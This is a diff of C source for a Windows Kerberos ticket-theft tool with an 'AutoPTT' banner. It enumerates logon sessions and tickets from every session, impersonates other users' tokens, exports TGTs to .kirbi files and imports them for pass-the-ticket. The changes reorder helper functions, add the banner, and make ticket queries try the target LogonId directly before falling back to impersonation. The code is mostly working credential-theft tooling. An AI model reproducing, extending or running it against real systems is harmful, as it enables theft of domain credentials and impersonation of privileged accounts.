@@ -1,4 +1,4 @@
-#define _CRT_SECURE_NO_WARNINGS
+﻿#define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
 #include <ntsecapi.h>
 #include <sddl.h>
@@ -32,14 +32,29 @@ typedef struct {
 TGT_INFO g_tgtList[MAX_TGTS];
 ULONG g_tgtCount = 0;
 
+static const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+
+void PrintDebug(const char* m) {
+    printf("[*] %s\n", m); 
+}
+
+
+void PrintSuccess(const char* m) {
+    printf("[+] %s\n", m);
+}
+
+
+void PrintError(const char* m) { 
+    printf("[-] %s\n", m); 
+}
+
+
 void PrintSeparator(const char* title) {
     printf("\n================================================================================\n");
     if (title) printf("  %s\n================================================================================\n", title);
 }
 
-void PrintDebug(const char* m) { printf("[*] %s\n", m); }
-void PrintSuccess(const char* m) { printf("[+] %s\n", m); }
-void PrintError(const char* m) { printf("[-] %s\n", m); }
 
 const wchar_t* GetLogonTypeString(ULONG t) {
     switch (t) {
@@ -53,6 +68,7 @@ const wchar_t* GetLogonTypeString(ULONG t) {
     }
 }
 
+
 const char* GetEncryptionTypeName(LONG e) {
     switch (e) {
     case 17: return "AES128-CTS-HMAC-SHA1-96";
@@ -62,7 +78,6 @@ const char* GetEncryptionTypeName(LONG e) {
     }
 }
 
-static const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
 char* Base64Encode(const unsigned char* data, size_t input_length) {
     size_t output_length = 4 * ((input_length + 2) / 3);
@@ -89,6 +104,7 @@ char* Base64Encode(const unsigned char* data, size_t input_length) {
     return encoded_data;
 }
 
+
 void PrintBase64(const char* base64_string) {
     if (!base64_string || strlen(base64_string) == 0) {
         printf("      (empty)\n");
@@ -96,6 +112,7 @@ void PrintBase64(const char* base64_string) {
     }
     printf("      %s\n", base64_string);
 }
+
 
 void AddTGTToList(ULONG logonId, const wchar_t* userName, const wchar_t* domain, const wchar_t* serviceName) {
     if (g_tgtCount >= MAX_TGTS) return;
@@ -136,6 +153,7 @@ void AddTGTToList(ULONG logonId, const wchar_t* userName, const wchar_t* domain,
     g_tgtCount++;
 }
 
+
 void PrintCurrentLogonId() {
     HANDLE t;
     TOKEN_STATISTICS s;
@@ -146,6 +164,7 @@ void PrintCurrentLogonId() {
         CloseHandle(t);
     }
 }
+
 
 void EnumerateLogonSessions() {
     HMODULE h = LoadLibraryA("secur32.dll");
@@ -200,6 +219,7 @@ void EnumerateLogonSessions() {
     FreeLibrary(h);
 }
 
+
 BOOL ImpersonateSession(ULONG targetLogonId, HANDLE* hImpToken) {
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
@@ -239,6 +259,7 @@ BOOL ImpersonateSession(ULONG targetLogonId, HANDLE* hImpToken) {
     CloseHandle(hSnapshot);
     return FALSE;
 }
+
 
 void PrintSessionInfo(PSECURITY_LOGON_SESSION_DATA session_data, ULONG logonIdLow) {
     wchar_t usr[256] = { 0 }, dom[256] = { 0 }, auth_pkg[256] = { 0 }, sid_str[256] = { 0 };
@@ -314,9 +335,10 @@ void PrintSessionInfo(PSECURITY_LOGON_SESSION_DATA session_data, ULONG logonIdLo
     printf("\n");
 }
 
-void PrintTicketDetails(KERB_TICKET_CACHE_INFO* t, const wchar_t* userName, const wchar_t* domain, 
-                       HANDLE lsa, ULONG auth, ULONG sessionLogonId,
-                       PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn, PLSA_FREE_RETURN_BUFFER fre_fn) {
+
+void PrintTicketDetails(KERB_TICKET_CACHE_INFO* t, const wchar_t* userName, const wchar_t* domain,
+    HANDLE lsa, ULONG auth, ULONG sessionLogonId,
+    PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn, PLSA_FREE_RETURN_BUFFER fre_fn) {
     wchar_t srv[512] = { 0 }, rlm[256] = { 0 };
 
     if (t->ServerName.Buffer && t->ServerName.Length > 0) {
@@ -445,10 +467,11 @@ void PrintTicketDetails(KERB_TICKET_CACHE_INFO* t, const wchar_t* userName, cons
     }
 }
 
+
 void EnumerateTicketsForSession(HANDLE lsa, ULONG auth, LUID sessionLuid, PSECURITY_LOGON_SESSION_DATA session_data,
-                               PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn, PLSA_FREE_RETURN_BUFFER fre_fn,
-                               BOOL collectTGTs, ULONG* total_tickets, ULONG* total_tgts) {
-    
+    PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn, PLSA_FREE_RETURN_BUFFER fre_fn,
+    BOOL collectTGTs, ULONG* total_tickets, ULONG* total_tgts) {
+
     wchar_t usr[256] = { 0 }, dom[256] = { 0 };
 
     if (session_data->UserName.Buffer && session_data->UserName.Length > 0) {
@@ -470,42 +493,34 @@ void EnumerateTicketsForSession(HANDLE lsa, ULONG auth, LUID sessionLuid, PSECUR
     NTSTATUS sub = 0;
     NTSTATUS status = -1;
 
-    HANDLE hImpToken = NULL;
-    BOOL needRevert = FALSE;
+    // PRIMERO: Intentar consulta directa especificando el LogonId
+    KERB_QUERY_TKT_CACHE_REQUEST req;
+    req.MessageType = KerbQueryTicketCacheMessage;
+    req.LogonId.LowPart = sessionLuid.LowPart;
+    req.LogonId.HighPart = sessionLuid.HighPart;
 
-    if (ImpersonateSession(sessionLuid.LowPart, &hImpToken)) {
-        if (ImpersonateLoggedOnUser(hImpToken)) {
-            needRevert = TRUE;
+    status = cal_fn(lsa, auth, &req, sizeof(req), (PVOID*)&rsp, &sz, &sub);
 
-            KERB_QUERY_TKT_CACHE_REQUEST req;
-            req.MessageType = KerbQueryTicketCacheMessage;
-            req.LogonId.LowPart = 0;
-            req.LogonId.HighPart = 0;
+    // Si la consulta directa falla, entonces intentar impersonación
+    if (status != 0 || sub != 0 || !rsp || rsp->CountOfTickets == 0) {
+        if (rsp) {
+            fre_fn(rsp);
+            rsp = NULL;
+        }
 
-            status = cal_fn(lsa, auth, &req, sizeof(req), (PVOID*)&rsp, &sz, &sub);
+        // Intentar con impersonación
+        HANDLE hImpToken = NULL;
+        if (ImpersonateSession(sessionLuid.LowPart, &hImpToken)) {
+            if (ImpersonateLoggedOnUser(hImpToken)) {
+                req.LogonId.LowPart = 0;
+                req.LogonId.HighPart = 0;
 
-            RevertToSelf();
-            CloseHandle(hImpToken);
+                status = cal_fn(lsa, auth, &req, sizeof(req), (PVOID*)&rsp, &sz, &sub);
 
-            if (status != 0 || sub != 0 || !rsp || rsp->CountOfTickets == 0) {
-                if (rsp) {
-                    fre_fn(rsp);
-                    rsp = NULL;
-                }
+                RevertToSelf();
             }
-        }
-        else {
             CloseHandle(hImpToken);
         }
-    }
-
-    if (!rsp) {
-        KERB_QUERY_TKT_CACHE_REQUEST req;
-        req.MessageType = KerbQueryTicketCacheMessage;
-        req.LogonId.LowPart = sessionLuid.LowPart;
-        req.LogonId.HighPart = sessionLuid.HighPart;
-
-        status = cal_fn(lsa, auth, &req, sizeof(req), (PVOID*)&rsp, &sz, &sub);
     }
 
     if (status != 0 || sub != 0 || !rsp || rsp->CountOfTickets == 0) {
@@ -539,6 +554,7 @@ void EnumerateTicketsForSession(HANDLE lsa, ULONG auth, LUID sessionLuid, PSECUR
     fre_fn(rsp);
     printf("\n");
 }
+
 
 void EnumerateMyTickets() {
     HMODULE h = LoadLibraryA("secur32.dll");
@@ -621,6 +637,7 @@ void EnumerateMyTickets() {
     FreeLibrary(h);
 }
 
+
 void EnumerateAllTickets() {
     PrintDebug("Enumerating tickets from ALL sessions on the machine...");
 
@@ -700,7 +717,7 @@ void EnumerateAllTickets() {
 
         ULONG tickets_before = total_tickets;
         EnumerateTicketsForSession(lsa, auth, session_list[i], session_data, cal_fn, fre_fn, TRUE, &total_tickets, &total_tgts);
-        
+
         if (total_tickets > tickets_before) {
             total_sessions_with_tickets++;
         }
@@ -736,6 +753,7 @@ void EnumerateAllTickets() {
     fre_fn(session_list);
     FreeLibrary(h);
 }
+
 
 void ExportTicket(const char* logonIdStr) {
     ULONG logonId = 0;
@@ -999,6 +1017,7 @@ void ExportTicket(const char* logonIdStr) {
     FreeLibrary(h);
 }
 
+
 void AutoExportAndImport() {
     PrintDebug("Auto mode: Enumerating tickets and importing selected TGT...");
 
@@ -1070,7 +1089,7 @@ void AutoExportAndImport() {
 
         ULONG tickets_before = total_tickets;
         EnumerateTicketsForSession(lsa, auth, session_list[i], session_data, cal_fn, fre_fn, TRUE, &total_tickets, &total_tgts);
-        
+
         if (total_tickets > tickets_before) {
             total_sessions_with_tickets++;
         }
@@ -1187,7 +1206,7 @@ void AutoExportAndImport() {
             cacheReq.LogonId.HighPart = targetLuid.HighPart;
             cacheStatus = cal_fn(lsa, auth, &cacheReq, sizeof(cacheReq), (PVOID*)&cacheRsp, &sz, &sub);
         }
-        
+
         if (cacheStatus != 0 || sub != 0 || !cacheRsp) {
             PrintError("Failed to get ticket cache");
             LsaDeregisterLogonProcess(lsa);
@@ -1369,6 +1388,7 @@ void AutoExportAndImport() {
     EnumerateMyTickets();
 }
 
+
 void PassTheTicket(const char* filename) {
     FILE* fp = fopen(filename, "rb");
     if (!fp) {
@@ -1507,6 +1527,17 @@ void PassTheTicket(const char* filename) {
     FreeLibrary(h);
 }
 
+
+void PrintBanner() {
+    printf("    ___         __        ____  __ ______\n");
+    printf("   /   | __  __/ /_____  / __ \\/ //_  __/\n");
+    printf("  / /| |/ / / / __/ __ \\/ /_/ / __// /\n");
+    printf(" / ___ / /_/ / /_/ /_/ / ____/ /_ / /\n");
+    printf("/_/  |_\\__,_/\\__/\\____/_/    \\__//_/\n");
+    printf("\n");
+}
+
+
 int main(int argc, char* argv[]) {
     (void)_setmode(_fileno(stdout), _O_U16TEXT);
     (void)_setmode(_fileno(stdout), _O_TEXT);
@@ -1534,22 +1565,23 @@ int main(int argc, char* argv[]) {
         PassTheTicket(argv[2]);
     }
     else {
+        PrintBanner();
         printf("Kerberos Sessions and Tickets Enumerator\n\n");
         printf("Usage:\n");
         printf("  %s sessions         - Enumerate logon sessions (like 'klist sessions')\n", argv[0]);
         printf("  %s klist            - Enumerate MY tickets (current session)\n", argv[0]);
         printf("  %s tickets          - Enumerate ALL tickets from ALL sessions\n", argv[0]);
-        printf("  %s auto             - Interactive: list TGTs and import selected one\n", argv[0]);
         printf("  %s export <LogonId> - Export TGT by LogonId (hex format)\n", argv[0]);
         printf("  %s ptt <file>       - Import .kirbi ticket\n\n", argv[0]);
+        printf("  %s auto             - Interactive: list TGTs and import selected one\n", argv[0]);
 
         printf("Examples:\n");
         printf("  %s sessions\n", argv[0]);
         printf("  %s klist\n", argv[0]);
         printf("  %s tickets          # View tickets from ALL sessions with Base64\n", argv[0]);
-        printf("  %s auto             # Interactive mode to import a TGT\n", argv[0]);
         printf("  %s export 0x79fb3   # Export TGT for LogonId 0x79fb3\n", argv[0]);
         printf("  %s ptt 0x79fb3_Administrator.kirbi\n", argv[0]);
+        printf("  %s auto             # Interactive mode to import a TGT\n", argv[0]);
     }
 
     return 0;
